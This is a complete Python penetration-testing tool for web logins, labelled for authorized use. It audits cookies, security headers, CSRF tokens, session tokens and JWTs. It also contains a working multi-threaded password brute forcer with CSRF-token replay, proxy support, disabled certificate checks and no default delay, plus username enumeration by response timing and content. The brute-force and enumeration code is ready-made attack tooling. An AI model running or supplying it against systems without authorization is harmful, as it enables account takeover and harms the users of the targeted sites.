#!/usr/bin/env python3
"""
Authentication Security Testing Framework
For authorized penetration testing only.

Features:
- Multi-protocol authentication testing
- Brute force with rate limit handling
- Session analysis and validation
- Token extraction and analysis
- CSRF token handling
- Proxy support
- Comprehensive reporting

Usage:
    python3 auth-tester.py --help
    python3 auth-tester.py bruteforce -t https://target.com/login -u admin -P passwords.txt
    python3 auth-tester.py analyze -t https://target.com/login
    python3 auth-tester.py session -t https://target.com --cookie "session=abc123"
"""

import argparse
import requests
import json
import re
import time
import sys
import threading
import hashlib
import base64
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, parse_qs, urlencode
from typing import Dict, List, Tuple, Optional, Any
import warnings

warnings.filterwarnings('ignore')

# ============================================================================
# CONFIGURATION
# ============================================================================

DEFAULT_USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
DEFAULT_THREADS = 10
DEFAULT_TIMEOUT = 10
DEFAULT_DELAY = 0  # milliseconds between requests

# ============================================================================
# UTILITY CLASSES
# ============================================================================

class Colors:
    """ANSI color codes for terminal output"""
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    END = '\033[0m'

    @staticmethod
    def disable():
        Colors.RED = ''
        Colors.GREEN = ''
        Colors.YELLOW = ''
        Colors.BLUE = ''
        Colors.MAGENTA = ''
        Colors.CYAN = ''
        Colors.WHITE = ''
        Colors.BOLD = ''
        Colors.END = ''


class Logger:
    """Logging utility with colored output"""

    @staticmethod
    def info(msg: str):
        print(f"{Colors.BLUE}[*]{Colors.END} {msg}")

    @staticmethod
    def success(msg: str):
        print(f"{Colors.GREEN}[+]{Colors.END} {msg}")

    @staticmethod
    def warning(msg: str):
        print(f"{Colors.YELLOW}[!]{Colors.END} {msg}")

    @staticmethod
    def error(msg: str):
        print(f"{Colors.RED}[-]{Colors.END} {msg}")

    @staticmethod
    def debug(msg: str, verbose: bool = False):
        if verbose:
            print(f"{Colors.CYAN}[D]{Colors.END} {msg}")


# ============================================================================
# AUTHENTICATION ANALYZER
# ============================================================================

class AuthAnalyzer:
    """Analyze authentication mechanisms and security configurations"""

    def __init__(self, target: str, session: requests.Session = None, verbose: bool = False):
        self.target = target
        self.session = session or requests.Session()
        self.verbose = verbose
        self.findings = []

        # Configure session
        self.session.headers.update({
            'User-Agent': DEFAULT_USER_AGENT
        })

    def analyze(self) -> Dict[str, Any]:
        """Run full authentication analysis"""
        Logger.info(f"Analyzing authentication at: {self.target}")

        results = {
            'target': self.target,
            'timestamp': datetime.now().isoformat(),
            'findings': []
        }

        # Fetch the target
        try:
            response = self.session.get(self.target, timeout=DEFAULT_TIMEOUT, verify=False)
        except requests.exceptions.RequestException as e:
            Logger.error(f"Failed to fetch target: {e}")
            return results

        # Run analysis checks
        results['findings'].extend(self._analyze_headers(response))
        results['findings'].extend(self._analyze_cookies(response))
        results['findings'].extend(self._analyze_form(response))
        results['findings'].extend(self._analyze_csrf(response))
        results['findings'].extend(self._analyze_security_headers(response))

        self._print_results(results)
        return results

    def _analyze_headers(self, response: requests.Response) -> List[Dict]:
        """Analyze response headers for auth-related information"""
        findings = []
        headers = response.headers

        # Check for authentication headers
        auth_headers = ['WWW-Authenticate', 'X-Auth-Token', 'Authorization']
        for header in auth_headers:
            if header in headers:
                findings.append({
                    'type': 'header',
                    'name': header,
                    'value': headers[header],
                    'severity': 'info'
                })

        return findings

    def _analyze_cookies(self, response: requests.Response) -> List[Dict]:
        """Analyze cookies for security issues"""
        findings = []

        for cookie in self.session.cookies:
            cookie_findings = {
                'type': 'cookie',
                'name': cookie.name,
                'issues': []
            }

            # Check HttpOnly flag
            if not cookie.has_nonstandard_attr('HttpOnly') and 'httponly' not in str(cookie).lower():
                # Check in Set-Cookie header
                set_cookie_headers = response.headers.get('Set-Cookie', '')
                if cookie.name in set_cookie_headers and 'httponly' not in set_cookie_headers.lower():
                    cookie_findings['issues'].append({
                        'issue': 'Missing HttpOnly flag',
                        'severity': 'medium',
                        'description': 'Cookie can be accessed via JavaScript, increasing XSS risk'
                    })

            # Check Secure flag
            if not cookie.secure:
                cookie_findings['issues'].append({
                    'issue': 'Missing Secure flag',
                    'severity': 'medium',
                    'description': 'Cookie can be transmitted over unencrypted connections'
                })

            # Check SameSite
            set_cookie_header = response.headers.get('Set-Cookie', '')
            if 'samesite' not in set_cookie_header.lower():
                cookie_findings['issues'].append({
                    'issue': 'Missing SameSite attribute',
                    'severity': 'low',
                    'description': 'Cookie may be vulnerable to CSRF attacks'
                })

            # Check for sensitive data in cookie value
            value = cookie.value.lower()
            sensitive_patterns = ['password', 'secret', 'token', 'key', 'auth']
            for pattern in sensitive_patterns:
                if pattern in value:
                    cookie_findings['issues'].append({
                        'issue': f'Potentially sensitive data in cookie ({pattern})',
                        'severity': 'high',
                        'description': 'Cookie may contain sensitive information'
                    })

            # Check for predictable session ID
            if len(cookie.value) < 20 and cookie.name.lower() in ['session', 'sessionid', 'sid']:
                cookie_findings['issues'].append({
                    'issue': 'Potentially weak session ID',
                    'severity': 'medium',
                    'description': 'Session ID appears short and may be predictable'
                })

            if cookie_findings['issues']:
                findings.append(cookie_findings)

        return findings

    def _analyze_form(self, response: requests.Response) -> List[Dict]:
        """Analyze login form for security issues"""
        findings = []

        # Check for password field autocomplete
        if 'autocomplete="off"' not in response.text.lower():
            if 'type="password"' in response.text.lower():
                findings.append({
                    'type': 'form',
                    'issue': 'Password field without autocomplete="off"',
                    'severity': 'low',
                    'description': 'Browser may cache password values'
                })

        # Check for form action over HTTP
        form_match = re.search(r'<form[^>]+action=["\']?(http://[^"\'>\s]+)', response.text, re.I)
        if form_match:
            findings.append({
                'type': 'form',
                'issue': 'Form submits over HTTP',
                'severity': 'high',
                'value': form_match.group(1),
                'description': 'Credentials transmitted without encryption'
            })

        return findings

    def _analyze_csrf(self, response: requests.Response) -> List[Dict]:
        """Check for CSRF protection"""
        findings = []

        # Common CSRF token patterns
        csrf_patterns = [
            r'csrf[_-]?token',
            r'_token',
            r'authenticity[_-]?token',
            r'__RequestVerificationToken',
            r'antiforgery',
            r'xsrf[_-]?token'
        ]

        has_csrf = False
        for pattern in csrf_patterns:
            if re.search(pattern, response.text, re.I):
                has_csrf = True
                findings.append({
                    'type': 'csrf',
                    'issue': f'CSRF token detected (pattern: {pattern})',
                    'severity': 'info',
                    'description': 'CSRF protection appears to be implemented'
                })
                break

        if not has_csrf and '<form' in response.text.lower():
            findings.append({
                'type': 'csrf',
                'issue': 'No CSRF token detected',
                'severity': 'medium',
                'description': 'Form may be vulnerable to CSRF attacks'
            })

        return findings

    def _analyze_security_headers(self, response: requests.Response) -> List[Dict]:
        """Check for security headers"""
        findings = []
        headers = response.headers

        security_headers = {
            'Strict-Transport-Security': 'high',
            'X-Content-Type-Options': 'low',
            'X-Frame-Options': 'medium',
            'X-XSS-Protection': 'low',
            'Content-Security-Policy': 'medium'
        }

        for header, severity in security_headers.items():
            if header not in headers:
                findings.append({
                    'type': 'security_header',
                    'issue': f'Missing {header} header',
                    'severity': severity,
                    'description': f'Security header {header} not set'
                })

        return findings

    def _print_results(self, results: Dict):
        """Print analysis results"""
        print(f"\n{Colors.BOLD}=== Authentication Analysis Results ==={Colors.END}\n")

        severity_colors = {
            'high': Colors.RED,
            'medium': Colors.YELLOW,
            'low': Colors.CYAN,
            'info': Colors.BLUE
        }

        for finding in results['findings']:
            if 'issues' in finding:  # Cookie findings
                print(f"{Colors.MAGENTA}[Cookie: {finding['name']}]{Colors.END}")
                for issue in finding['issues']:
                    color = severity_colors.get(issue['severity'], Colors.WHITE)
                    print(f"  {color}[{issue['severity'].upper()}]{Colors.END} {issue['issue']}")
            else:
                color = severity_colors.get(finding.get('severity', 'info'), Colors.WHITE)
                print(f"{color}[{finding.get('severity', 'info').upper()}]{Colors.END} {finding.get('issue', finding.get('name', 'Unknown'))}")


# ============================================================================
# BRUTE FORCE ENGINE
# ============================================================================

class BruteForcer:
    """Multi-threaded authentication brute force engine"""

    def __init__(self, target: str, method: str = 'POST',
                 username_field: str = 'username', password_field: str = 'password',
                 failure_string: str = None, success_string: str = None,
                 threads: int = DEFAULT_THREADS, delay: int = DEFAULT_DELAY,
                 proxy: str = None, verbose: bool = False):
        self.target = target
        self.method = method.upper()
        self.username_field = username_field
        self.password_field = password_field
        self.failure_string = failure_string
        self.success_string = success_string
        self.threads = threads
        self.delay = delay / 1000.0  # Convert to seconds
        self.proxy = proxy
        self.verbose = verbose

        # Statistics
        self.attempts = 0
        self.found = False
        self.found_credentials = []
        self.lock = threading.Lock()
        self.start_time = None

        # Session configuration
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': DEFAULT_USER_AGENT,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive'
        })

        if proxy:
            self.session.proxies = {
                'http': proxy,
                'https': proxy
            }

        # CSRF token handling
        self.csrf_token = None
        self.csrf_field = None

    def _fetch_csrf_token(self) -> Optional[str]:
        """Fetch CSRF token from login page"""
        try:
            response = self.session.get(self.target, timeout=DEFAULT_TIMEOUT, verify=False)

            # Common CSRF patterns
            patterns = [
                (r'name=["\']csrf[_-]?token["\'][^>]*value=["\']([^"\']+)["\']', 'csrf_token'),
                (r'name=["\']_token["\'][^>]*value=["\']([^"\']+)["\']', '_token'),
                (r'name=["\']authenticity_token["\'][^>]*value=["\']([^"\']+)["\']', 'authenticity_token'),
                (r'name=["\']__RequestVerificationToken["\'][^>]*value=["\']([^"\']+)["\']', '__RequestVerificationToken'),
            ]

            for pattern, field_name in patterns:
                match = re.search(pattern, response.text, re.I)
                if match:
                    self.csrf_field = field_name
                    return match.group(1)

            # Try meta tag
            meta_match = re.search(r'<meta[^>]+name=["\']csrf-token["\'][^>]+content=["\']([^"\']+)["\']', response.text, re.I)
            if meta_match:
                self.csrf_field = 'csrf-token'
                return meta_match.group(1)

        except requests.exceptions.RequestException:
            pass

        return None

    def _try_login(self, username: str, password: str) -> Optional[Tuple[str, str]]:
        """Attempt single login"""
        if self.found:
            return None

        try:
            # Prepare data
            data = {
                self.username_field: username,
                self.password_field: password
            }

            # Add CSRF token if present
            if self.csrf_token and self.csrf_field:
                data[self.csrf_field] = self.csrf_token

            # Make request
            if self.method == 'POST':
                response = self.session.post(
                    self.target,
                    data=data,
                    timeout=DEFAULT_TIMEOUT,
                    allow_redirects=True,
                    verify=False
                )
            else:
                response = self.session.get(
                    self.target,
                    params=data,
                    timeout=DEFAULT_TIMEOUT,
                    allow_redirects=True,
                    verify=False
                )

            # Update statistics
            with self.lock:
                self.attempts += 1
                if self.attempts % 100 == 0:
                    elapsed = time.time() - self.start_time
                    rate = self.attempts / elapsed if elapsed > 0 else 0
                    Logger.info(f"Progress: {self.attempts} attempts ({rate:.1f}/sec)")

            # Check result
            is_success = False

            if self.success_string:
                if self.success_string in response.text:
                    is_success = True
            elif self.failure_string:
                if self.failure_string not in response.text:
                    is_success = True
            else:
                # Default: check for common success indicators
                success_indicators = ['dashboard', 'welcome', 'logout', 'profile', 'account']
                for indicator in success_indicators:
                    if indicator.lower() in response.text.lower():
                        is_success = True
                        break

            if is_success:
                return (username, password)

            # Delay between requests
            if self.delay > 0:
                time.sleep(self.delay)

        except requests.exceptions.RequestException as e:
            Logger.debug(f"Request error for {username}:{password} - {e}", self.verbose)

        return None

    def run(self, usernames: List[str], passwords: List[str]) -> List[Tuple[str, str]]:
        """Run brute force attack"""
        Logger.info(f"Target: {self.target}")
        Logger.info(f"Users: {len(usernames)}, Passwords: {len(passwords)}")
        Logger.info(f"Total combinations: {len(usernames) * len(passwords)}")
        Logger.info(f"Threads: {self.threads}")

        # Fetch CSRF token
        self.csrf_token = self._fetch_csrf_token()
        if self.csrf_token:
            Logger.info(f"CSRF token found ({self.csrf_field})")

        self.start_time = time.time()

        # Run brute force
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = []

            for username in usernames:
                for password in passwords:
                    if self.found:
                        break
                    futures.append(
                        executor.submit(self._try_login, username, password)
                    )
                if self.found:
                    break

            for future in as_completed(futures):
                result = future.result()
                if result:
                    self.found = True
                    self.found_credentials.append(result)
                    Logger.success(f"VALID CREDENTIALS: {result[0]}:{result[1]}")

        elapsed = time.time() - self.start_time
        Logger.info(f"Completed in {elapsed:.2f} seconds ({self.attempts} attempts)")

        return self.found_credentials


# ============================================================================
# SESSION ANALYZER
# ============================================================================

class SessionAnalyzer:
    """Analyze session token security"""

    def __init__(self, target: str, cookie: str = None, verbose: bool = False):
        self.target = target
        self.cookie = cookie
        self.verbose = verbose
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': DEFAULT_USER_AGENT})

        if cookie:
            # Parse and set cookies
            for c in cookie.split(';'):
                if '=' in c:
                    name, value = c.strip().split('=', 1)
                    self.session.cookies.set(name, value)

    def analyze_tokens(self) -> Dict[str, Any]:
        """Analyze session tokens"""
        results = {
            'target': self.target,
            'timestamp': datetime.now().isoformat(),
            'tokens': []
        }

        # Collect multiple tokens
        Logger.info("Collecting session tokens...")
        tokens = []
        for i in range(5):
            try:
                response = self.session.get(self.target, timeout=DEFAULT_TIMEOUT, verify=False)
                for cookie in self.session.cookies:
                    if cookie.name.lower() in ['session', 'sessionid', 'sid', 'phpsessid', 'jsessionid']:
                        tokens.append({
                            'name': cookie.name,
                            'value': cookie.value,
                            'timestamp': time.time()
                        })
                time.sleep(0.5)
            except requests.exceptions.RequestException as e:
                Logger.error(f"Request failed: {e}")

        if not tokens:
            Logger.warning("No session tokens found")
            return results

        # Analyze token patterns
        for token in tokens:
            analysis = self._analyze_token(token['value'])
            token['analysis'] = analysis
            results['tokens'].append(token)

        # Check for predictability
        if len(tokens) >= 2:
            predictability = self._check_predictability([t['value'] for t in tokens])
            results['predictability'] = predictability

        self._print_results(results)
        return results

    def _analyze_token(self, token: str) -> Dict[str, Any]:
        """Analyze individual token"""
        analysis = {
            'length': len(token),
            'entropy_estimate': self._estimate_entropy(token),
            'encoding': self._detect_encoding(token),
            'patterns': []
        }

        # Check for common patterns
        if re.match(r'^[0-9]+$', token):
            analysis['patterns'].append('Numeric only - potentially predictable')

        if re.match(r'^[a-f0-9]+$', token.lower()):
            analysis['patterns'].append('Hexadecimal - likely hash or UUID')

        if len(token) == 32:
            analysis['patterns'].append('32 chars - possibly MD5')
        elif len(token) == 40:
            analysis['patterns'].append('40 chars - possibly SHA1')
        elif len(token) == 64:
            analysis['patterns'].append('64 chars - possibly SHA256')

        # Check for base64
        if analysis['encoding'] == 'base64':
            try:
                decoded = base64.b64decode(token)
                analysis['decoded_preview'] = decoded[:50].decode('utf-8', errors='ignore')
            except:
                pass

        return analysis

    def _estimate_entropy(self, token: str) -> float:
        """Estimate token entropy"""
        charset_size = 0
        if re.search(r'[a-z]', token):
            charset_size += 26
        if re.search(r'[A-Z]', token):
            charset_size += 26
        if re.search(r'[0-9]', token):
            charset_size += 10
        if re.search(r'[^a-zA-Z0-9]', token):
            charset_size += 32

        if charset_size == 0:
            return 0

        import math
        return len(token) * math.log2(charset_size)

    def _detect_encoding(self, token: str) -> str:
        """Detect token encoding"""
        # Check base64
        if re.match(r'^[A-Za-z0-9+/]+=*$', token):
            try:
                base64.b64decode(token)
                return 'base64'
            except:
                pass

        # Check URL encoding
        if '%' in token:
            return 'url_encoded'

        # Check hex
        if re.match(r'^[a-fA-F0-9]+$', token):
            return 'hex'

        return 'unknown'

    def _check_predictability(self, tokens: List[str]) -> Dict[str, Any]:
        """Check if tokens are predictable"""
        result = {
            'is_sequential': False,
            'has_timestamp': False,
            'low_entropy': False
        }

        # Check for sequential patterns
        try:
            numeric_tokens = [int(t) for t in tokens if t.isdigit()]
            if len(numeric_tokens) >= 2:
                diffs = [numeric_tokens[i+1] - numeric_tokens[i] for i in range(len(numeric_tokens)-1)]
                if len(set(diffs)) == 1:
                    result['is_sequential'] = True
                    result['increment'] = diffs[0]
        except:
            pass

        # Check for timestamp patterns
        current_time = int(time.time())
        for token in tokens:
            # Check if token contains timestamp
            for i in range(len(token) - 9):
                try:
                    potential_ts = int(token[i:i+10])
                    if abs(potential_ts - current_time) < 86400:  # Within 24 hours
                        result['has_timestamp'] = True
                        break
                except:
                    continue

        return result

    def _print_results(self, results: Dict):
        """Print analysis results"""
        print(f"\n{Colors.BOLD}=== Session Token Analysis ==={Colors.END}\n")

        for token in results.get('tokens', []):
            print(f"{Colors.CYAN}Token: {token['name']}{Colors.END}")
            print(f"  Value: {token['value'][:50]}..." if len(token['value']) > 50 else f"  Value: {token['value']}")

            analysis = token.get('analysis', {})
            print(f"  Length: {analysis.get('length', 'N/A')}")
            print(f"  Entropy: {analysis.get('entropy_estimate', 0):.1f} bits")
            print(f"  Encoding: {analysis.get('encoding', 'unknown')}")

            for pattern in analysis.get('patterns', []):
                print(f"  {Colors.YELLOW}Pattern: {pattern}{Colors.END}")

            print()

        if 'predictability' in results:
            pred = results['predictability']
            if pred.get('is_sequential'):
                print(f"{Colors.RED}[!] Tokens appear SEQUENTIAL (increment: {pred.get('increment')}){Colors.END}")
            if pred.get('has_timestamp'):
                print(f"{Colors.YELLOW}[!] Tokens may contain TIMESTAMP{Colors.END}")


# ============================================================================
# JWT ANALYZER (Inline)
# ============================================================================

class JWTAnalyzer:
    """Basic JWT analysis capabilities"""

    def __init__(self, token: str):
        self.token = token
        self.header = None
        self.payload = None
        self.signature = None

    def decode(self) -> Dict[str, Any]:
        """Decode JWT without verification"""
        parts = self.token.split('.')
        if len(parts) != 3:
            raise ValueError("Invalid JWT format")

        def b64_decode(data: str) -> str:
            # Add padding if needed
            padding = 4 - len(data) % 4
            if padding != 4:
                data += '=' * padding
            return base64.urlsafe_b64decode(data).decode('utf-8')

        self.header = json.loads(b64_decode(parts[0]))
        self.payload = json.loads(b64_decode(parts[1]))
        self.signature = parts[2]

        return {
            'header': self.header,
            'payload': self.payload,
            'signature': self.signature
        }

    def analyze(self) -> Dict[str, Any]:
        """Analyze JWT for security issues"""
        try:
            decoded = self.decode()
        except Exception as e:
            return {'error': str(e)}

        findings = []

        # Check algorithm
        alg = self.header.get('alg', '')
        if alg.lower() == 'none':
            findings.append({
                'severity': 'critical',
                'issue': 'Algorithm "none" - token not signed'
            })
        elif alg.lower() == 'hs256':
            findings.append({
                'severity': 'info',
                'issue': 'HS256 algorithm - symmetric key, potential for brute force'
            })

        # Check expiration
        exp = self.payload.get('exp')
        if exp:
            if exp < time.time():
                findings.append({
                    'severity': 'info',
                    'issue': f'Token expired at {datetime.fromtimestamp(exp)}'
                })
            elif exp > time.time() + 86400 * 30:  # More than 30 days
                findings.append({
                    'severity': 'medium',
                    'issue': 'Long expiration time (>30 days)'
                })
        else:
            findings.append({
                'severity': 'medium',
                'issue': 'No expiration claim (exp)'
            })

        # Check for sensitive data
        sensitive_keys = ['password', 'secret', 'key', 'credit', 'ssn']
        for key in self.payload.keys():
            if any(s in key.lower() for s in sensitive_keys):
                findings.append({
                    'severity': 'high',
                    'issue': f'Potentially sensitive claim: {key}'
                })

        # Check jku/x5u
        if 'jku' in self.header:
            findings.append({
                'severity': 'medium',
                'issue': f'JKU header present: {self.header["jku"]} - test for SSRF/injection'
            })

        if 'x5u' in self.header:
            findings.append({
                'severity': 'medium',
                'issue': f'X5U header present: {self.header["x5u"]} - test for SSRF/injection'
            })

        return {
            'decoded': decoded,
            'findings': findings
        }


# ============================================================================
# USER ENUMERATION
# ============================================================================

class UserEnumerator:
    """Enumerate valid usernames via timing/response analysis"""

    def __init__(self, target: str, username_field: str = 'username',
                 password_field: str = 'password', threads: int = 5,
                 verbose: bool = False):
        self.target = target
        self.username_field = username_field
        self.password_field = password_field
        self.threads = threads
        self.verbose = verbose
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': DEFAULT_USER_AGENT})
        self.valid_users = []
        self.lock = threading.Lock()

    def enumerate(self, usernames: List[str], method: str = 'timing') -> List[str]:
        """Enumerate valid users"""
        Logger.info(f"Enumerating users via {method} analysis")
        Logger.info(f"Target: {self.target}")
        Logger.info(f"Users to test: {len(usernames)}")

        if method == 'timing':
            return self._timing_enumeration(usernames)
        elif method == 'response':
            return self._response_enumeration(usernames)
        else:
            Logger.error(f"Unknown method: {method}")
            return []

    def _timing_enumeration(self, usernames: List[str]) -> List[str]:
        """Enumerate via response timing differences"""
        # First, establish baseline
        Logger.info("Establishing timing baseline...")
        baseline_times = []

        for _ in range(5):
            try:
                start = time.time()
                self.session.post(
                    self.target,
                    data={
                        self.username_field: f"nonexistent{time.time()}",
                        self.password_field: "wrongpassword"
                    },
                    timeout=DEFAULT_TIMEOUT,
                    verify=False
                )
                baseline_times.append(time.time() - start)
            except:
                pass

        if not baseline_times:
            Logger.error("Could not establish baseline")
            return []

        avg_baseline = sum(baseline_times) / len(baseline_times)
        threshold = avg_baseline * 1.5  # 50% longer is suspicious

        Logger.info(f"Baseline response time: {avg_baseline:.3f}s (threshold: {threshold:.3f}s)")

        # Test each username
        suspicious = []
        for username in usernames:
            try:
                times = []
                for _ in range(3):
                    start = time.time()
                    self.session.post(
                        self.target,
                        data={
                            self.username_field: username,
                            self.password_field: "wrongpassword"
                        },
                        timeout=DEFAULT_TIMEOUT,
                        verify=False
                    )
                    times.append(time.time() - start)

                avg_time = sum(times) / len(times)
                if avg_time > threshold:
                    suspicious.append((username, avg_time))
                    Logger.success(f"Potential valid user: {username} (time: {avg_time:.3f}s)")

            except Exception as e:
                Logger.debug(f"Error testing {username}: {e}", self.verbose)

        return [u[0] for u in suspicious]

    def _response_enumeration(self, usernames: List[str]) -> List[str]:
        """Enumerate via response content differences"""
        Logger.info("Collecting response patterns...")

        # Get baseline response for invalid user
        try:
            invalid_response = self.session.post(
                self.target,
                data={
                    self.username_field: f"definitelyinvalid{time.time()}",
                    self.password_field: "wrongpassword"
                },
                timeout=DEFAULT_TIMEOUT,
                verify=False
            )
            invalid_text = invalid_response.text
            invalid_len = len(invalid_text)
        except Exception as e:
            Logger.error(f"Could not get baseline: {e}")
            return []

        # Test each username
        valid = []
        for username in usernames:
            try:
                response = self.session.post(
                    self.target,
                    data={
                        self.username_field: username,
                        self.password_field: "wrongpassword"
                    },
                    timeout=DEFAULT_TIMEOUT,
                    verify=False
                )

                # Check for differences
                if len(response.text) != invalid_len:
                    valid.append(username)
                    Logger.success(f"Different response for: {username} (len: {len(response.text)} vs {invalid_len})")
                elif response.text != invalid_text:
                    valid.append(username)
                    Logger.success(f"Different content for: {username}")

            except Exception as e:
                Logger.debug(f"Error testing {username}: {e}", self.verbose)

        return valid


# ============================================================================
# MAIN ENTRY POINT
# ============================================================================

def load_wordlist(filepath: str) -> List[str]:
    """Load wordlist from file"""
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        Logger.error(f"Wordlist not found: {filepath}")
        sys.exit(1)


def main():
    parser = argparse.ArgumentParser(
        description='Authentication Security Testing Framework',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Brute force login
  %(prog)s bruteforce -t https://target.com/login -u admin -P passwords.txt -f "Invalid"

  # Analyze authentication
  %(prog)s analyze -t https://target.com/login

  # Analyze session tokens
  %(prog)s session -t https://target.com --cookie "session=abc123"

  # Enumerate users
  %(prog)s enumerate -t https://target.com/login -U users.txt

  # Analyze JWT
  %(prog)s jwt -T "eyJhbGciOiJIUzI1NiIsInR..."
        """
    )

    subparsers = parser.add_subparsers(dest='command', help='Command to run')

    # Bruteforce subcommand
    bf_parser = subparsers.add_parser('bruteforce', help='Brute force authentication')
    bf_parser.add_argument('-t', '--target', required=True, help='Target login URL')
    bf_parser.add_argument('-u', '--user', help='Single username')
    bf_parser.add_argument('-U', '--users', help='Username wordlist file')
    bf_parser.add_argument('-p', '--password', help='Single password')
    bf_parser.add_argument('-P', '--passwords', help='Password wordlist file')
    bf_parser.add_argument('--user-field', default='username', help='Username field name')
    bf_parser.add_argument('--pass-field', default='password', help='Password field name')
    bf_parser.add_argument('-f', '--failure', help='Failure indicator string')
    bf_parser.add_argument('-s', '--success', help='Success indicator string')
    bf_parser.add_argument('--threads', type=int, default=DEFAULT_THREADS, help='Number of threads')
    bf_parser.add_argument('--delay', type=int, default=0, help='Delay between requests (ms)')
    bf_parser.add_argument('--proxy', help='Proxy URL (http://host:port)')
    bf_parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')

    # Analyze subcommand
    analyze_parser = subparsers.add_parser('analyze', help='Analyze authentication mechanism')
    analyze_parser.add_argument('-t', '--target', required=True, help='Target URL')
    analyze_parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')

    # Session subcommand
    session_parser = subparsers.add_parser('session', help='Analyze session tokens')
    session_parser.add_argument('-t', '--target', required=True, help='Target URL')
    session_parser.add_argument('--cookie', help='Session cookie to use')
    session_parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')

    # Enumerate subcommand
    enum_parser = subparsers.add_parser('enumerate', help='Enumerate valid users')
    enum_parser.add_argument('-t', '--target', required=True, help='Target login URL')
    enum_parser.add_argument('-U', '--users', required=True, help='Username wordlist file')
    enum_parser.add_argument('--user-field', default='username', help='Username field name')
    enum_parser.add_argument('--pass-field', default='password', help='Password field name')
    enum_parser.add_argument('--method', choices=['timing', 'response'], default='response', help='Enumeration method')
    enum_parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')

    # JWT subcommand
    jwt_parser = subparsers.add_parser('jwt', help='Analyze JWT token')
    jwt_parser.add_argument('-T', '--token', required=True, help='JWT token to analyze')
    jwt_parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')

    args = parser.parse_args()

    if not args.command:
        parser.print_help()
        sys.exit(1)

    # Execute command
    if args.command == 'bruteforce':
        # Prepare username list
        usernames = []
        if args.user:
            usernames = [args.user]
        elif args.users:
            usernames = load_wordlist(args.users)
        else:
            Logger.error("Specify -u/--user or -U/--users")
            sys.exit(1)

        # Prepare password list
        passwords = []
        if args.password:
            passwords = [args.password]
        elif args.passwords:
            passwords = load_wordlist(args.passwords)
        else:
            Logger.error("Specify -p/--password or -P/--passwords")
            sys.exit(1)

        bruteforcer = BruteForcer(
            target=args.target,
            username_field=args.user_field,
            password_field=args.pass_field,
            failure_string=args.failure,
            success_string=args.success,
            threads=args.threads,
            delay=args.delay,
            proxy=args.proxy,
            verbose=args.verbose
        )

        results = bruteforcer.run(usernames, passwords)

        if results:
            print(f"\n{Colors.GREEN}Found credentials:{Colors.END}")
            for user, pwd in results:
                print(f"  {user}:{pwd}")

    elif args.command == 'analyze':
        analyzer = AuthAnalyzer(args.target, verbose=args.verbose)
        analyzer.analyze()

    elif args.command == 'session':
        analyzer = SessionAnalyzer(args.target, cookie=args.cookie, verbose=args.verbose)
        analyzer.analyze_tokens()

    elif args.command == 'enumerate':
        usernames = load_wordlist(args.users)
        enumerator = UserEnumerator(
            target=args.target,
            username_field=args.user_field,
            password_field=args.pass_field,
            verbose=args.verbose
        )
        valid_users = enumerator.enumerate(usernames, method=args.method)

        if valid_users:
            print(f"\n{Colors.GREEN}Potentially valid users:{Colors.END}")
            for user in valid_users:
                print(f"  {user}")

    elif args.command == 'jwt':
        analyzer = JWTAnalyzer(args.token)
        results = analyzer.analyze()

        if 'error' in results:
            Logger.error(results['error'])
        else:
            print(f"\n{Colors.BOLD}=== JWT Analysis ==={Colors.END}\n")
            print(f"{Colors.CYAN}Header:{Colors.END}")
            print(json.dumps(results['decoded']['header'], indent=2))
            print(f"\n{Colors.CYAN}Payload:{Colors.END}")
            print(json.dumps(results['decoded']['payload'], indent=2))

            if results['findings']:
                print(f"\n{Colors.CYAN}Security Findings:{Colors.END}")
                for finding in results['findings']:
                    severity = finding['severity']
                    if severity == 'critical':
                        color = Colors.RED
                    elif severity == 'high':
                        color = Colors.RED
                    elif severity == 'medium':
                        color = Colors.YELLOW
                    else:
                        color = Colors.BLUE
                    print(f"  {color}[{severity.upper()}]{Colors.END} {finding['issue']}")


if __name__ == '__main__':
    main()
